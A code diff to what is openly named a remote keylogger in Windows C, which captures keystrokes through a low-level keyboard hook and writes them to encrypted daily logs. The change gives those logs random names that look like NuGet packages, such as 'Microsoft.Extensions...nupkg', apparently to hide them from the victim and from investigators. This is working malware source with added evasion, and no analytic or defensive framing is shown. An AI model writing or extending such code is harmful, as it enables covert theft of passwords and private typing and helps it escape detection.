@@ -17,6 +17,9 @@
 #include <psapi.h>
 #pragma comment(lib, "psapi.lib")
 
+#include <bcrypt.h>
+#pragma comment(lib, "bcrypt.lib")
+
 #ifndef WH_KEYBOARD_LL
 #define WH_KEYBOARD_LL 13
 #endif
@@ -29,6 +32,9 @@ static volatile long g_keylogger_running = 0;
 static HANDLE g_keylogger_thread = NULL;
 static HANDLE g_keylogger_mutex = NULL;
 static char g_logs_dir[MAX_PATH] = { 0 };
+/* One encrypted log file per UTC calendar day; random NuGet package-style .nupkg name (date in encrypted body only). */
+static char g_day_log_bin_path[MAX_PATH] = { 0 };
+static unsigned int g_day_log_ymd = 0; /* (year<<16)|(month<<8)|day, UTC */
 static char* g_keylogger_buf = NULL;
 static size_t g_keylogger_buf_len = 0;
 static char g_last_title[256] = { 0 };
@@ -654,6 +660,30 @@ static LRESULT CALLBACK low_level_kb_proc(int nCode, WPARAM wParam, LPARAM lPara
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+static unsigned int pack_ymd_utc(const SYSTEMTIME* st) {
+    return ((unsigned)st->wYear << 16) | ((unsigned)st->wMonth << 8) | (unsigned)st->wDay;
+}
+
+/* e.g. Microsoft.Extensions.Logging.8.3.12.a1b2c3d4e5f6a7b8.nupkg — date is only inside the encrypted HTML header. */
+static int generate_nuget_style_bin_name(char* out, size_t out_size) {
+    unsigned char rnd[16];
+    NTSTATUS status = BCryptGenRandom(NULL, rnd, sizeof(rnd), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+    if (!BCRYPT_SUCCESS(status)) return 0;
+    unsigned a = (unsigned)rnd[0] | ((unsigned)rnd[1] << 8) | ((unsigned)rnd[2] << 16) | ((unsigned)rnd[3] << 24);
+    unsigned b = (unsigned)rnd[4] | ((unsigned)rnd[5] << 8) | ((unsigned)rnd[6] << 16) | ((unsigned)rnd[7] << 24);
+    unsigned c = (unsigned)rnd[8] | ((unsigned)rnd[9] << 8) | ((unsigned)rnd[10] << 16) | ((unsigned)rnd[11] << 24);
+    unsigned m = (a % 40u) + 1u;
+    unsigned n = (b % 20u);
+    unsigned p = (c % 50u);
+    static const char* vendors[] = {
+        "Microsoft", "System", "Azure", "Newtonsoft", "StackExchange", "NuGet", "AspNetCore"
+    };
+    size_t vi = (size_t)(rnd[12] % (sizeof(vendors) / sizeof(vendors[0])));
+    _snprintf_s(out, out_size, _TRUNCATE, "%s.Extensions.%u.%u.%u.%08x%08x.nupkg",
+        vendors[vi], m, n, p, a, b);
+    return 1;
+}
+
 static void flush_to_disk(void) {
     if (!g_keylogger_buf || g_keylogger_buf_len == 0 || !g_logs_dir[0]) return;
     WaitForSingleObject(g_keylogger_mutex, INFINITE);
@@ -668,9 +698,17 @@ static void flush_to_disk(void) {
     CreateDirectoryA(g_logs_dir, NULL);
     SYSTEMTIME st;
     GetSystemTime(&st);
+    unsigned int ymd = pack_ymd_utc(&st);
+    if (g_day_log_ymd != ymd || g_day_log_bin_path[0] == '\0') {
+        g_day_log_ymd = ymd;
+        char name[160];
+        if (!generate_nuget_style_bin_name(name, sizeof(name)))
+            _snprintf_s(name, sizeof(name), _TRUNCATE, "NuGet.Package.%08x.%08x.nupkg", GetTickCount(), (unsigned)ymd);
+        _snprintf_s(g_day_log_bin_path, sizeof(g_day_log_bin_path), _TRUNCATE, "%s\\%s", g_logs_dir, name);
+    }
+
     char fname[MAX_PATH];
-    _snprintf_s(fname, sizeof(fname), _TRUNCATE, "%s\\%04u-%02u-%02u.bin",
-        g_logs_dir, (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay);
+    strncpy_s(fname, sizeof(fname), g_day_log_bin_path, _TRUNCATE);
 
     int write_header = (GetFileAttributesA(fname) == INVALID_FILE_ATTRIBUTES) ? 1 : 0;
     size_t plain_len = len;
@@ -814,6 +852,8 @@ int remote_keylogger_start(const char* logs_dir, const struct remote_config* con
 
     if (InterlockedCompareExchange(&g_keylogger_running, 1, 0) != 0) return 1;
     strncpy_s(g_logs_dir, sizeof(g_logs_dir), logs_dir, _TRUNCATE);
+    g_day_log_bin_path[0] = '\0';
+    g_day_log_ymd = 0;
     g_keylogger_mutex = CreateMutexA(NULL, FALSE, NULL);
     if (!g_keylogger_mutex) { InterlockedExchange(&g_keylogger_running, 0); return 0; }
     g_keylogger_buf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, KEYLOGGER_BUF_SIZE);
